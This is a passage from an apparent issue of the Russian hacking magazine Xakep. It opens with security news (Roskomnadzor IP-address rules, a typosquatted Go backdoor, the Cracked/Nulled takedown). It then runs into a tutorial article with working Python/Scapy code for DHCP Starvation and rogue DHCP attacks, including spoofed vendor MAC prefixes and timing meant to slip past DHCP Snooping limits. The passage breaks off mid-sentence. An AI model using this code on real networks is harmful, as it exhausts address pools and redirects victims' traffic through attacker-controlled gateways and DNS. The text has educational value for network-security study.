   установки оборудования, абонентские номера, идентификатор пользователь‐
   ского оборудования и другие данные, позволяющие идентифицировать або‐
   нента, сведения о соединениях, трафике и платежах), представляют собой
   тайну связи.
      Предоставлять третьим лицам такие сведения оператор может только
  с согласия абонента, если иное не предусмотрено законом.
      Также МТС предложила установить разные требования о необходимых
   данных для мобильных и фиксированных операторов. В компании пояснили,
   что в 95% случаев подключения клиентов‑физлиц к мобильным сетям через
   маршрутизатор  широкополосного  удаленного  доступа (BRAS)  нет  воз‐
   можности  точно  определить,  что  именно они  используют для выхода
   в интернет: компьютер, ноутбук или смартфон.
     Кроме того, отмечается, что сейчас у компании нет технической воз‐
   можности предоставлять сведения о регионе, районе, городском округе и так
   далее, где используются конкретные IP-адреса, как того требует проект при‐
   каза.
     Для реализации требования МТС потребуется около полугода, потому что
   придется существенно менять архитектуру сети (строить новые узлы связи,
   перестраивать сеть передачи данных и так далее) и создавать дополнитель‐
  ные системы.

           «Архитектура некоторых сегментов сети глубоко интегрирована, и на
          уровне   публичных   IP-адресов   дополнительное  их   разделение «
        и локализация приведет к снижению надежности, и без значительных
           затрат модернизация сети невозможна, — отмечается в отзыве. —
          Оценить финансовые затраты на указанные мероприятия в настоящее
          время не представляется возможным, в том числе в связи с отсутс-
          твием на рынке большей части необходимого для этого оборудования
           связи».                 »
  В своем ответе на отзыв МТС Роскомнадзор настаивает, что проект не пот‐
   ребует от операторов предоставлять сведения, составляющие тайну связи.
   Идентификация отдельных пользователей и их пользовательского оборудо‐
  вания не требуется, а нужны сведения о локализации выделяемого поль‐
   зователям адресного пространства по регионам России, а также сведения
  о выделяемых связках IPv4- и IPv6-адресов.
    В  ответе на  другой отзыв  представители РКН  указали, что в  связи
  с переходом операторов на технологию двойной адресации Dual-Stack (ког‐
  да одновременно используются протоколы IPv4 и IPv6) ТСПУ не может
   однозначно идентифицировать принадлежность трафика конкретному поль‐
   зователю, что приводит к снижению эффективности ограничения трафика
   к противоправным ресурсам.
    В нескольких ответах на отзывы РКН отметил, что часть пунктов приказа
  будет скорректирована.


         «Часть предложений, в том числе от компании МТС, будет учтена.
         Документу предстоит пройти этап подготовки заключения ОРВ (оценки «
          регулирующего воздействия), регистрации в Минюсте. После этого он
         будет опубликован на портале pravo.gov.ru», — заявил представитель
         РКН.                 »
  По информации СМИ, «Ростелеком» не видит больших проблем в предос‐
   тавлении информации, которую запрашивает Роскомнадзор, и исполнит
   положения проекта в полном объеме.


  ПИРАТЫ ТЕРЯЮТ ДЕНЬГИ
   По оценке FACCT, объем рынка онлайн‑пиратства в России в 2024 году составил 36,4 мил-
  лиона долларов (3,36 миллиарда рублей по среднему номинальному курсу ЦБ РФ за год).

   При этом доходы нелегальных распространителей видеоконтента упали на 4,2%. Аналитики
    связывают это с успешной блокировкой пиратских сайтов, удалением ссылок из поисковой
   выдачи и снижением количества трафика на такие ресурсы.





   Доходы пиратов снижаются уже 6 лет подряд, но в последнее время темпы падения замед‐
   лились: с 16% в 2023 году до 4% в 2024 году.

   При этом за прошедший год количество пиратских доменов все равно выросло на 37,5%
   (появилось около 110 тысяч новых ресурсов).

   Доля пиратских сайтов в целом увеличилась по сравнению с другими источниками распростра‐
   нения нелегального видеоконтента на 12% и составила 94% от общего числа. Аналитики объ‐
   ясняют этот рост пополнением базы фильмов и сериалов пиратских видеобалансеров (CDN),
   которые в большинстве случаев используют владельцы пиратских кинотеатров.





 ЗЛОУПОТРЕБЛЕНИЕ
GO MODULE MIRROR
   Исследователь обнаружил бэкдор, маскирующийся под легитимный Go-
   пакет, который используют тысячи организаций. Вредонос оставался незаме‐
   ченным несколько лет и сохранился в кеше Go Module Mirror.
      Аналитик из компании Socket Security Кирилл Бойченко рассказал об ата‐
   ке,  связанной  с  модулем  BoltDB,  зависимость  от  которого  имеют
  более 8000 других пакетов и который используют такие крупные организации,
   как Shopify и Heroku.
     BoltDB был создан девять лет назад, но год спустя автор проекта объявил
  о завершении разработки, и с тех пор BoltDB не обновлялся.
      Неизвестный злоумышленник использовал тайпсквоттинг, выдавая свой
   вредоносный  пакет  за  BoltDB. Если  разработчик  случайно  перепутает
   легитимный    пакет   с    подделкой,    расположенной   по    адресу
   github(.)com/boltdb-go/bolt, он  загрузит  бэкдор,  позволяющий  удаленно
   выполнить произвольный код.





   Бойченко сообщил, что вредоносная версия все еще доступна для поиска
  через Go Module Proxy и оставалась незамеченной в течение трех лет.
     К счастью, малварь не заметило и большинство мейнтейнеров, так как за
   прошедшие годы было зафиксировано всего два случая импорта бэкдора.
  Оба были связаны с криптовалютным проектом, у которого насчитывается
   всего семь подписчиков.
      Невозможно узнать, сколько именно раз был загружен вредоносный
   пакет, поскольку Go не отслеживает эту статистику. Но если посмотреть
  на страницу подделки на GitHub, можно заметить, что у нее нет ни звезд,
  ни форков и за три года не было сделано ни одного пул‑реквеста.
      Однако Бойченко подчеркивает, что злоумышленник злоупотреблял сис‐
  темой Go-пакетов таким способом, который требует более внимательного
   изучения со стороны разработчиков.
      Вредоносный  пакет  boltdb-go был  опубликован на  GitHub  в  нояб‐
  ре 2021 года. При первом запросе Go Module Mirror кешировал его и сделал
   доступным на неопределенный срок. После этого автор вредоносного про‐
   екта изменил Git-теги проекта, указав на легитимную версию пакета (boltdb),
   чтобы при ручном анализе boltdb-go не обнаруживалось никаких признаков
   мошенничества. Хотя вредоносная версия по‑прежнему распространялась
   среди ничего не подозревающих разработчиков.


         «Эта атака — один из первых задокументированных случаев исполь-
         зования злоумышленником бессрочного кеширования в Go Module «
           Mirror, — объясняет Бойченко. — Хотя о предыдущих случаях не сооб-
        щалось публично, этот инцидент подчеркивает острую необходимость
         повышения  осведомленности  о  подобных  тактиках  персистенции
         в будущем».                 »
  По словам эксперта, неизменяемые модули (immutable modules), с одной
   стороны, повышают безопасность, но с другой — создают потенциальные
   векторы для  злоупотреблений. Поэтому  разработчикам и  специалистам
  по безопасности нужно отслеживать атаки, использующие кешированные
   версии модулей для уклонения от обнаружения.
    По сути, неизменяемые модули защищают популярные пакеты от несан‐
   кционированных изменений. Это положительно сказывается на безопасности
   экосистемы и лежит в основе многих функций Go, которые, по мнению раз‐
   работчиков,  помогают  смягчить  атаки на  цепочки  поставок. Но  также
   это означает, что, если вредоносная версия (такая как boltdb-go) проникнет
   в кеш, она останется там навсегда.

          «Чтобы снизить риски атак на цепочки поставок, разработчикам сле-
         дует проверять целостность пакетов перед установкой, анализировать «
          зависимости на предмет аномалий и использовать защитные инстру-
          менты, которые проверяют установленный код на более глубоком
           уровне, — заключает Бойченко. — Чтобы экосистема модулей Go оста-
         валась устойчивой к подобным атакам, необходимо постоянно про-
         являть  бдительность,  совершенствовать  механизмы  безопасности
        и лучше понимать, как злоумышленники эксплуатируют каналы рас-
         пространения ПО».                 »

 12% НЕЦЕЛЕВОГО ТРАФИКА

    Эксперты RUVDS сообщили, что за год уровень нелегитимного трафика веб‑серверов в России
   вырос        до      от общего количества. При этом половина трафика приходится на активность   ботнетов.12%

   Кроме зараженных IoT-устройств, в ботнеты все чаще попадают арендованные или заражен‐
   ные виртуальные машины и серверы, которые затем применяют для DDoS-атак и рас‐
   пространения малвари.





 ЗАКРЫТЫ CRACKED
 И NULLED
   Правоохранители из США, Италии, Испании, Франции, Греции, Австралии
  и Румынии провели совместную международную операцию Talent, в рамках
  которой были закрыты такие сайты, как cracked(.)io, cracked(.)to, nulled(.)to,
   starkrdp(.)io, mysellix(.)io и sellix(.)io. Европол и полиция Германии подтвердили
  арест двух подозреваемых и захват семнадцати серверов.
     Cracked и Nulled — два крупных хакфорума, суммарно насчитывающих
  более 10 миллионов пользователей. В основном эти ресурсы были ориенти‐
   рованы на киберпреступность, кражу паролей, хакинг и credential-stuffing-ата‐
   ки.
    На сайтах публиковались хакерские инструменты, включая тулзы и скрипты
  для поиска уязвимостей и оптимизации атак, конфиги для credential-stuffing-
   инструментов (таких как OpenBullet и SilverBullet) и другой запрещенный кон‐
   тент, в том  числе материалы,  связанные со взломом ПО, комболисты
  с ворованными учетными данными и базами данных.
    Еще в конце января СМИ обратили внимание, что на Cracked, Nulled и дру‐
   гих перечисленных выше доменах появились баннеры, сообщающие, что сай‐
  ты (а также информация об их клиентах и жертвах) конфискованы правоох‐
   ранителями в рамках операции Talent. Кроме того, ФБР изменило name-сер‐
  веры доменов с Cloudflare на ns1.fbi.seized.gov и ns2.fbi.seized.gov.
     StarkRDP (starkrdp(.)io) — это виртуальный хостинг‑провайдер Windows
  RDP, который рекламировался на обоих хакфорумах и управлялся теми же
   людьми. А MySellIX и SellIX (sellix(.)io и mysellix(.)io) были платежными процес‐
  сорами, которыми пользовались участники форумов.
      Немецкие правоохранители заявили, что закрыли SellIX и StarkRDP, пос‐
   кольку те «были непосредственной частью экономической сети хакерских
   платформ».
      Операторы  Cracked  подтверждали  конфискацию  доменов  в  своем
   Telegram-канале и  писали,  что  пока  ожидают  получения  официальных
   документов от дата‑центра и хостера. «Это по‑настоящему печальный день
  для нашего сообщества», — гласило сообщение администрации.
      Через несколько дней Министерство юстиции США сообщило, на Cracked
  было зарегистрировано более 4 миллионов пользователей и размещалось
   порядка 28 миллионов объявлений о продаже инструментов для киберпрес‐
   тупников. Доход администраторов площадки правоохранители оценивают
   в 4 миллиона долларов США и подчеркивают, что жертвами злоумышленни‐
   ков стали более 17 миллионов человек только в США.
    В свою очередь, на Nulled было зарегистрировано более 5 миллионов
   пользователей, размещалось порядка 43 миллионов объявлений, а годовой
  доход администрации оценивается в миллион долларов США.

        «Оба этих форума, связанные с подпольной экономикой, обеспечива-
        ли быстрый выход на киберпреступную сцену. Эти сайты работали «
          как   универсальные   магазины  и   использовались   не   только
         для обсуждения киберпреступлений, но и как площадки для продажи
         нелегальных товаров и хакерских услуг, включая украденные данные,
          вредоносное ПО и  инструменты для взлома», — в свою очередь,
         заявил Европол.                 »
  Суммарно было захвачено двенадцать доменов Cracked и Nulled, а также лик‐
   видированы другие связанные с ними сервисы, включая упомянутые SellIX
  и StarkRDP. Также власти провели обыски на семи объектах недвижимости,
   изъяли более 50 электронных устройств и около 300 тысяч евро в виде налич‐
  ных и криптовалюты.

          «Изъятые данные (адреса электронной почты, IP-адреса и способы
           связи для примерно 10 миллионов зарегистрированных пользовате- «
         лей) станут основой для дальнейших международных расследований
         в отношении преступников, выступавших продавцами и пользовате-
        лями  этих  платформ», —  добавили  представители  Федерального
         ведомства уголовной полиции Германии (Bundeskriminalamt, BKA).                 »
   Национальная полиция Испании объявила об аресте двух подозреваемых,
   связанных с деятельностью Cracked и Nulled. Кроме того, по данным Минюс‐
   та США, в Испании уже выдвинуты обвинения против 28-летнего Лукаса Сона
   (Lucas  Sohn),  одного  из  администраторов  Nulled,  который  занимался
   эскроу‑функциями на сайте.
      Пока неясно, был ли Сон одним из двух арестованных подозреваемых.
  Если его признают виновным, ему грозит пять лет лишения свободы за сго‐
  вор с целью незаконного оборота паролей, десять лет за мошенничество
  с устройствами доступа и пятнадцать лет за мошенничество с личными дан‐
  ными.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Мошенники присылают жертвам фальшивые бумажные повестки


   Android будет блокировать загрузку сторонних приложений во время звонков


   Антидетект‑браузер AdsPower взломали. У пользователей украли криптовалюту


   Новый способ обфускации JavaScript: через невидимые символы Unicode


   Обнаружен новый производитель коммерческого шпионского ПО


   Для борьбы с вредоносными обновлениями в PyPI появится система архивации


    Хакер продает коды доступа для 20 миллионов аккаунтов OpenAI


   Apple исправила 0-day, использовавшийся в «чрезвычайно сложных» атаках


   На GitHub нашли сотни репозиториев с вредоносным кодом


    Cloudflare принудительно внесли в реестр ОРИ
COVERSTORY





В этой статье я познакомлю тебя с атаками
EIGRP  Abusing  K-values,  DTP  Spoofing,
DHCP Starvation, CAM Table Overflow и еще
несколькими. Чтобы проиллюстрировать их,
                                                                             Александр Михайловя приведу код на Python, который исполь‐
                                                                                             mikhailov.alexander99@yandex.ru
зовал для создания своего, более мощного
аналога утилиты Yersinia.


ЗАДУМКА

Как‑то раз, когда я был студентом третьего курса, у меня стояла задача
написать курсовую работу по техникам проведения атак на DHCP-сервер.
Взяв эту тему, я начал вникать: что это за протокол, как он работает, какие
есть атаки и так далее. Когда с теорией было покончено, дело оставалось
за малым: показать на практике, как я реализовал атаку на DHCP-сервер.
С программированием я тогда был знаком мало и уж точно не знал о том,
как работает манипуляция сетевыми пакетами.
  Я начал копать подходящие тулзы. Мое внимание привлекла Yersinia —
утилита, в которую входят инструменты для проведения атак на протоколы L2,
в том числе и на DHCP. Она показалась мне многообещающей и относитель‐
но легкой в обращении и понимании. Я взялся за дело с энтузиазмом,
но довольно скоро я уже раскачивался перед экраном, держась руками
за голову. Что‑то явно шло не так.
   Никакого результата добиться не удавалось, и спустя некоторое время я
таки выяснил, что проблема не в недостатке у меня знаний, а в том, что сама
тулза не работает как положено. Именно тогда мне пришла в голову мысль
написать свое, правильно работающее приложение.
   Может быть, атаки на DHCP с Yersinia при некоторых условиях провернуть
и можно, но атаки на другие протоколы канального уровня не работали вовсе!
К тому же по части юзабилити Yersinia хромала на обе ноги.
   Приведу пример проблемы: если выбрать атаку на совершенно любой
протокол,  то  в  ответ  пользователь  не  получает  практически  никакой
информации о статусе атаки — запущена она или не запущена, перехвачены
какие‑либо пакеты или не перехвачены, возникла ошибка или нет и так далее.
   Помучившись с этим, я преисполнился решимости писать адекватную
замену. К тому же была мысль реализовать поддержку большего числа про‐
токолов. Например, Yersinia не работает с протоколами динамической мар‐
шрутизации.


КОНЦЕПЦИЯ

Для  разработки  я  взял  Python и  библиотеку  Scapy,  предназначенную
для крафтинга сетевых пакетов. В сумме это два мощнейших и относительно
простых в использовании инструмента.
   Вдобавок к этому я решил создать собственное графическое приложение,
аналогичное Yersinia, но с корректно работающими атаками на сетевые про‐
токолы.
  В качестве UI-библиотеки я решил для начала взять что‑нибудь простое
и выбрал CustomTkinter.





Свое детище я назвал Salmonella — тоже семейство энтеробактерий по ана‐
логии с Yersinia.
  Я вижу взаимодействие с приложением так. На главном экране я выбираю
интересующий меня протокол.





Далее мне предлагается выбрать технику атаки на этот протокол.





После выбора атаки открывается отдельное окно, в котором можно вводить
параметры атаки, прослушивать сеть и так далее.
   Приступаем к кодированию!


DHCP

Моя первая статья в «Хакере» как раз была посвящена теме атак на DHCP.
В ней я подробно писал, в частности, о том, что это за протокол и какими
сообщениями он оперирует. Здесь я повторю лишь основные тезисы.
   Сообщения DHCP. Для нормальной работы DHCP требуется всего четыре
сообщения: DISCOVER, OFFER, REQUEST, ACK, запомнить которые очень
легко по первым буквам — DORA.
   Клиент использует сообщение DISCOVER, чтобы найти DHCP-серверы.
Если сервер получает такое сообщение, он отправляет клиенту сообщение
OFFER, где указывает сетевые параметры, предлагаемые клиенту. Если сер‐
веров несколько, то каждый из них ответит.
   Как правило, клиент отвечает тому серверу, сообщение которого пришло
первым. В ответ клиент шлет сообщение REQUEST. Сервер, увидев, что кли‐
ент принял его предложение, резервирует предложенный клиенту IP-адрес
у себя в памяти и отправляет последнее сообщение ACK, которое под‐
тверждает, что теперь клиент может использовать выданные ему сетевые
параметры.


DHCP Starvation
Мы знаем, что DHCP-сервер ведет таблицу соответствий выданных клиентам
IP-адресов и их MAC-адресов и что уже выданный IP-адрес нельзя предлагать
другому клиенту. Суть атаки DHCP Starvation в том, чтобы «истощить» сервер
DHCP, отправляя ложные пакеты типа DHCPDISCOVER с рандомными MAC-
адресами источника. Сервер будет реагировать на эти пакеты и резер‐
вировать свободные IP-адреса из пула, в результате чего некоторое время
(пока атака в активной фазе) не сможет выдавать IP-адреса обычным поль‐
зователям.
   У Yersinia есть ряд проблем с атаками DHCP Starvation.
   Первая и главная проблема — отправка лишь сообщений DISCOVER.
Вспомним, что для успешного взаимодействия клиент и сервер должны
отправить друг другу по два сообщения. Yersinia отправляет только одно
сообщение: после получения OFFER от сервера она не шлет свой REQUEST,
из‑за чего взаимодействие клиента и сервера не считается успешно завер‐
шенным. Именно поэтому DHCP-сервер резервирует IP-адрес лишь через
несколько минут после того, как предложил его клиенту в сообщении OFFER.
   Вторая проблема — групповые MAC-адреса. В сообщениях DISCOVER
в поле источника Ethernet-кадра иногда указываются групповые MAC-адреса.
DHCP-сервер не воспринимает такие сообщения и просто игнорирует их.
А таким может быть каждое второе сообщение.





Третья проблема: цель Yersinia — не истощить DHCP-сервер, а задушить
отправкой огромного количества DISCOVER-пакетов, что, по сути, является
DoS.
  Все эти проблемы я решил. Посмотрим на интерфейс  атаки DHCP
Starvation в моей утилите.





Тут можно  указать  количество  отправляемых  пакетов, задать интервал
для отправки сообщений DISCOVER, выбрать интерфейс и IP-адрес DHCP-
сервера (если их  несколько и нужен  конкретный). Возможность задать
интервал отправки для пакетов DISCOVER я добавил для обхода rate-limit
у DHCP Snooping.
   Теперь давай посмотрим на код. Для начала я определяю, какие выбраны
параметры, и сохраняю пользовательский ввод в переменных:


# Если количество пакетов определяется вводом с клавиатуры
if radiobutton_number_of_packages_var.get() == 1:
    number_of_packages = int(entry_number_of_packages.get()) + 1
# Если количество пакетов определяется выбором из комбобокса
if radiobutton_number_of_packages_var.get() == 2:
    if combobox_number_of_packages.get() == "/20 (4096 addresses)":
        number_of_packages = 4097
    if combobox_number_of_packages.get() == "/21 (2048 addresses)":
        number_of_packages = 2049
    if combobox_number_of_packages.get() == "/22 (1024 addresses)":
        number_of_packages = 1025
    if combobox_number_of_packages.get() == "/23 (512 addresses)":
        number_of_packages = 513
    if combobox_number_of_packages.get() == "/24 (256 addresses)":
        number_of_packages = 257
    if combobox_number_of_packages.get() == "/25 (128 addresses)":
        number_of_packages = 129
    if combobox_number_of_packages.get() == "/26 (64 addresses)":
        number_of_packages = 65
    if combobox_number_of_packages.get() == "/27 (32 addresses)":
        number_of_packages = 33
    if combobox_number_of_packages.get() == "/28 (16 addresses)":
        number_of_packages = 17
    if combobox_number_of_packages.get() == "/29 (8 addresses)":
        number_of_packages = 9
    if combobox_number_of_packages.get() == "/30 (4 addresses)":
        number_of_packages = 5


# Если выбран определенный DHCP-сервер
if radiobutton_dhcp_server_var.get() == 2:
    dhcp_server = entry_dhcp_server.get()


# Если чекбокс не активен, то по умолчанию интервал равен нулю
if checkbox_interval_var.get() == "off":
    interval = 0
if checkbox_interval_var.get() == "on":
    interval = int(combobox_interval.get())

Итак, если не выбран определенный IP-адрес DHCP-сервера:


# Если в качестве IP-адреса DHCP-сервера выбран любой IP-адрес
if radiobutton_dhcp_server_var.get() == 1:


# Устанавливаем счетчик отправленных пакетов для уведомлений и
диагностики
packages_sent = 0


# Устанавливаем цикл, по количеству итераций равный количеству
отправляемых пакетов
for i in range(1, number_of_packages):
        # Функция для представления MAC-адреса в виде байтов
    def mac_to_bytes(mac_addr: str) -> bytes:
        return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")
     # Формируем OUI
    mac_list = ["04:b0:e7:", "18:1e:b0:",  # HUAWEI/Samsung
                "b8:ca:3a:", "fc:08:4a:",  # Dell/Fujitsu
                "00:25:2e:", "2c:c2:53:",  # Cisco/Apple
                "c4:65:16:", "38:d5:47:",  # HP/ASUS
                "e4:1f:13:", "9c:32:ce:",  # IBM/Canon
                "d0:28:ba:", "6c:24:83:",  # Realme/Microsoft
                "44:90:46:", "74:d4:35:",  # HONOR/GIGABYTE
                "88:70:8c:", "90:e8:68:",  # Lenovo/AzureWave
                "a4:1a:6e:", "d0:c7:c0:",  # ZTE/TPlink
                "c8:13:37:", "00:05:c9:",  # Juniper/LG
                "24:21:ab:", "fc:75:16:",  # Sony/D-Link
                "60:9c:9f:", "00:00:aa:"]  # Brocade/Xerox


        # Генерируем оставшиеся три байта
    mac = [random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
random.randint(0x00, 0x7f)]
    # Приводим их в вид MAC-адреса
    client_mac = ':'.join(map(lambda x: '%02x' % x, mac))
    # Генерируем уникальный идентификатор транзакции для четырех
сообщений DORA
    xid = random.randint(0x00000000, 0xffffffff)
    # Объединяем OUI и вторые три байта
    client_mac = random.choice(mac_list) + client_mac

Уже предвкушаю вопросы про список mac_list! Сейчас поясню.
   Как я уже говорил, DHCP-сервер не реагирует на сообщения DHCP,
в которых в качестве MAC-адреса источника указан групповой MAC. Я начал
использовать глобальные уникальные MAC-адреса (с помощью RandMAC()),
но результат оказался таким же: мой DHCP-сервер на роутере Cisco игно‐
рировал сообщение DISCOVER, а в Wireshark оно выглядело так, как будто я
использовал групповые MAC-адреса:

      Source MAC must not be a group address«               »
Тогда я нашел интересную информацию по этому вопросу:

      MAC-адрес, указанный/записанный Wireshark, не является известным
      MAC-адресом, а представляет собой случайный MAC-адрес«                »
То есть MAC-адрес должен узнаваться по первым трем байтам. Таким обра‐
зом, я погуглил и собрал первые три байта (OUI) для оборудования наиболее
известных вендоров и составил список mac_list. При каждой генерации
MAC-адреса происходит выбор случайного OUI из этого списка.
   Далее генерируется вторая (случайная) часть MAC-адреса и объединяет‐
ся с OUI случайно выбранного вендора. Уникальный глобальный MAC готов!
Мой роутер Cisco стал реагировать на каждый MAC-адрес, сгенерированный
таким образом.
  В следующем блоке кода непосредственно генерируются сообщения
DHCP DISCOVER:


discover_packet = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") / \
                  IP(src="0.0.0.0", dst="255.255.255.255") / \
                  UDP(sport=68, dport=67) / \
                  BOOTP(op=1, chaddr=mac_to_bytes(client_mac), xid=
xid) / \
                  DHCP(options=[("message-type", "discover"), "end"])
response_for_discover = srp1(discover_packet, timeout=2, verbose=0,
iface=combobox_interface.get())

Отправляем сообщение discover_packet методом srp1 и ждем один ответ.
   Дальше анализируем полученный ответ. Запишем его в переменную
response_for_discover:


# Если ответ был получен и это DHCP OFFER
if response_for_discover and response_for_discover[DHCP].options[0][1
] == 2:
    options = response_for_discover[DHCP].options
    for i, item in enumerate(options):
        if item[0] == 'server_id':
            server_id = i
        if item[0] == 'router':
            router = i
        if item[0] == 'lease_time':
            lease_time = i
        if item[0] == 'subnet_mask':
            subnet_mask = i
        if item[0] == 'name_server':
            name_server = i


    request_packet = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") /
\
                     IP(src="0.0.0.0", dst="255.255.255.255") / \
                     UDP(sport=68, dport=67) / \
                     BOOTP(op=1, chaddr=mac_to_bytes(client_mac), xid
=xid) / \
                     DHCP(options=[("message-type", "request"), ("
requested_addr", response_for_discover[BOOTP].yiaddr),
                                   ("server_id",
response_for_discover[DHCP].options[server_id][1]),
                                   ("router", response_for_discover[
DHCP].options[router][1]),
                                   ("name_server",
response_for_discover[DHCP].options[name_server][1]),
                                   ("subnet_mask",
response_for_discover[DHCP].options[subnet_mask][1]),
                                   ("lease_time", int(
response_for_discover[DHCP].options[lease_time][1])), "end"])
    response_for_request = srp1(request_packet, timeout=5, verbose=0,
iface=combobox_interface.get())

Из сообщения OFFER, в котором DHCP-сервер предлагает нам свои сетевые
параметры (IP-адрес, маска сети, IP-адрес DHCP-сервера, IP-адрес шлюза
по умолчанию, DNS-сервер и время аренды), мы записываем их в соответс‐
твующие переменные. Часть этих параметров представлена в виде опций.
Это далеко не все параметры, которые сервер предлагает клиенту, но их дос‐
таточно, чтобы клиент мог нормально работать в сети.
  И еще пару слов об опциях DHCP. В Scapy они представлены в виде спис‐
ка пар ключ — значение, где ключ — это название опции, а значение — ее
содержимое. Как я понял, нет какой‑то строгой очередности, в которой опции
будут располагаться в списке options. То есть у каждого устройства может
быть своя индексация опций в списке. Например, у роутера Cisco опция
lease_time может иметь индекс 8, а у роутера Huawei индекс lease_time
равен 7. Поэтому в цикле for я использую встроенную функцию enumerate(
options), чтобы определить позицию той или иной опции в списке options.
   Отправляем сообщение REQUEST и ждем ответа:


response_for_request = srp1(request_packet, timeout=2, verbose=0,
iface=combobox_interface.get())
# 5 — это ACK
if response_for_request and response_for_request[DHCP].options[0][1]
== 5:


        # Счетчик отправленных пакетов
    packages_sent += 1
    time.sleep(interval)

Если получен ответ через сообщение DHCP ACK, то счетчик отправленных
пакетов увеличивается, выдерживается заданный интервал (если он указан)
и цикл начинается заново.
   Можешь  сравнить,  как  выглядит дамп  трафика  в  Yersinia и нашей
Salmonella.





                    Дамп трафика в Yersinia





                   Дамп трафика в Salmonella

Нажатием на кнопку Start запускается атака DHCP Starvation, а progressbar
информирует тебя о ее работе.





Когда атака завершается, всплывает окно, где говорится, сколько свободных
IP-адресов мы украли из пула DHCP (именно для этого я использовал счетчик
отправленных пакетов).





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

 СЕТЕВЫЕ ПРОТОКОЛЫ
  ПОД МИКРОСКОПОМ
       РЕАЛИЗУЕМ АТАКИ НА DHCP, EIGRP,
              DTP И ARP В ПРИЛОЖЕНИИ
                         НА PYTHON




Ну и напоследок взглянем на таблицу соответствий DHCP.





Все работает, и эта таблица не обнулится спустя пару минут, как в Yersinia.


Rogue DHCP
Rogue DHCP требует развернуть мошеннический DHCP-сервер. Нужно это,
чтобы выдавать клиентам поддельные сетевые параметры (в частности —
адрес шлюза по умолчанию) и перехватывать трафик. С точки зрения ата‐
кующего, для  этого лучше всего первым делом «положить» легитимный
DHCP-сервер, что мы, собственно, и сделали выше.
  К той атаке Rogue DHCP, которая реализована в Yersinia, у меня вопросов
нет, она работает как надо. Но информации при этом выводится очень мало.
Хотелось бы знать хотя бы о том, сколько ложных IP-адресов мы дали в арен‐
ду клиентам. Именно это я и реализовал в Salmonella.





              Выбираем Rogue DHCP из списка атак на DHCP

Признаюсь, тут я ничего не менял и сделал всё, как у Yersinia. Разве что
добавил выбор интерфейса.
   Итак, пользователь заполняет все поля в окне, после чего выполняется
следующий код:


pool = []
start_host = int(entry_rogue_dhcp_start_ip.get().split('.')[-1])
end_host = int(entry_rogue_dhcp_end_ip.get().split('.')[-1])
count = (end_host - start_host) + 1
subnet = entry_rogue_dhcp_start_ip.get().split('.')[0:3]
subnet = subnet[0] + "." + subnet[1] + "." + subnet[2] + "."

Здесь мы создаем пустой список pool, где будем формировать пул IP-адре‐
сов. По четвертым октетам start_host и end_host определяем первый
и последний адреса пула, а также адрес сети subnet — по первым трем окте‐
там. Временно предположим, что пользователь будет задавать сеть по маске
/24.
   Сохраняем остальные параметры в переменных:


interface = combobox_rogue_dhcp_interface.get()
ip_dhcp_server = entry_rogue_dhcp_ip_address.get()
gateway = entry_rogue_dhcp_gateway.get()
dns = entry_rogue_dhcp_dns.get()
lease_time = entry_rogue_dhcp_lease_time.get()
domain_name = entry_rogue_dhcp_domain_name.get()
subnet_mask = entry_rogue_dhcp_subnet_mask.get()

Список pool заполняем IP-адресами, которые будем выдавать клиентам,
переменную position, которая будет определять IP-адрес в списке, выс‐
тавляем в 0 (в начало списка pool) и создаем базу данных на минималках:
у нас за нее будет словарь database, где мы будем записывать, какому MAC-
адресу клиента какой выданный IP соответствует:


for i in range(count):
    pool.append(subnet + str(start_host))
    start_host += 1


position = 0
database = {}

Запускаем цикл while, который будет захватывать пакеты DHCP по фильтру
filter="udp  and  (port  67  or  port  68) и передавать в функцию
packet_handler, пока не будет выдано такое количество IP-адресов (count
= (end_host - start_host) + 1), которое указал пользователь:


while count > 0:
    sniff(iface=interface, prn=packet_handler, filter="udp and (port
67 or port 68)", store=0, count=1)

Вот что происходит в функции packet_handler:


if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 1:  #
Опция 1 — DHCP Discover
    def mac_to_bytes(mac_addr: str) -> bytes:
        return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")


    mac_address = packet[Ether].src
    xid = packet[BOOTP].xid


        # Если MAC-адрес уже есть в базе (отправлял DHCP Discover)
    if mac_address in database:
        offer = (Ether(dst="ff:ff:ff:ff:ff:ff") /
                 IP(src=ip_dhcp_server, dst="255.255.255.255") /
                 UDP(sport=67, dport=68) /
                 BOOTP(op=2, chaddr=mac_to_bytes(mac_address), xid=
xid, yiaddr=database[mac_address], siaddr=ip_dhcp_server) /
                 DHCP(options=[("message-type", "offer"), ("server_id
", ip_dhcp_server), ("router", gateway),
                               ("name_server", dns), ("subnet_mask",
subnet_mask), ("lease_time", int(lease_time)),
                               ("domain", domain_name), "end"]))
        sendp(offer, iface=interface)


        # Если MAC-адреса нет в базе (не отправлял DHCP Discover)
    if mac_address not in database:
        database[mac_address] = pool[position]


        offer = (Ether(dst="ff:ff:ff:ff:ff:ff") /
                 IP(src=ip_dhcp_server, dst="255.255.255.255") /
                 UDP(sport=67, dport=68) /
                 BOOTP(op=2, chaddr=mac_to_bytes(mac_address), xid=
xid, yiaddr=database[mac_address], siaddr=ip_dhcp_server) /
                 DHCP(options=[("message-type", "offer"), ("server_id
", ip_dhcp_server), ("router", gateway),
                               ("name_server", dns), ("subnet_mask",
subnet_mask), ("lease_time", int(lease_time)),
                               ("domain", domain_name), "end"]))
        sendp(offer, iface=interface)
        position += 1

Сейчас будет длинное, но важное объяснение. Этот блок кода анализирует
только сообщения DHCP DISCOVER  (if  packet.haslayer(DHCP)  and
packet[DHCP].options[0][1] == 1: # Опция 1 — DHCP Discover). MAC-
адрес клиента mac_address и идентификатор транзакции xid запоминаем
для дальнейшей отправки ответов (OFFER и ACK) клиенту.
   Дальше идут два условия if, которые определяют, есть ли MAC-адрес
клиента в словаре database. Если MAC-адреса в словаре database нет, то
все логично: добавляем его, присваиваем ему очередной IP-адрес из пула
(database[mac_address] = pool[position]) и отправляем клиенту сооб‐
щение DHCP OFFER с IP-адресом для устройства (то есть его MAC). Ты
можешь спросить, для чего второе условие if и код, который срабатывает,
если MAC-адрес уже есть в словаре database?
   Если сообщение DHCP DISCOVER от клиента — это начальный этап вза‐
имодействия с сервером, то как MAC-адрес клиента мог оказаться в словаре
